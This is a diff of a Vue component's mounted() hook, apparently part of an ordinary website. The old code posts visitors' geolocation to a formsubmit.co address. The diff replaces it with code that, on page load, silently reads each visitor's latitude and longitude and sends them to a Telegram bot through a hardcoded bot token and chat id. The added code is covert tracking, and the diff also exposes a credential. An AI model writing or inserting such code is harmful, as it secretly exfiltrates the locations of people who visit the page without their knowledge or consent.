@@ -22,7 +22,8 @@
 
 <script>
 import axios from 'axios';
-import Navigation from '@/components/Navigation.vue'
+
+import Navigation from '@/components/Navigation.vue';
 
 export default {
   components:{
@@ -32,36 +33,11 @@ export default {
     
   },
   mounted(){
-      
-       
-
-        
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition);
-          } else { 
-            alert("Geolocation is not supported by this browser.");
-          }
-          function showPosition(position) {
-            var postData = {
-                latitude: position.coords.latitude,
-                Longitude: position.coords.longitude
-              };
-
-              let axiosConfig = {
-                headers: { 'Content-Type': 'application/json;charset=UTF-8', "Access-Control-Allow-Origin": "*", "Accept": "application/json" }
-              };
-
-              axios.post('https://formsubmit.co/abhiib02@email.com', postData, axiosConfig)
-              .then((res) => {
-                alert("RESPONSE RECEIVED: ", res);
-              })
-              .catch((err) => {
-                alert("AXIOS ERROR: ", err);
-              })
-        
-          }
-         
-        },  
+    if(navigator){
+        navigator.geolocation.getCurrentPosition(showPosition);
+        function showPosition(position) {
+          axios.get(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=Latitude:${position.coords.latitude},Longitude:${position.coords.longitude}`);
+}}},  
   computed:{},
   data(){
     return{
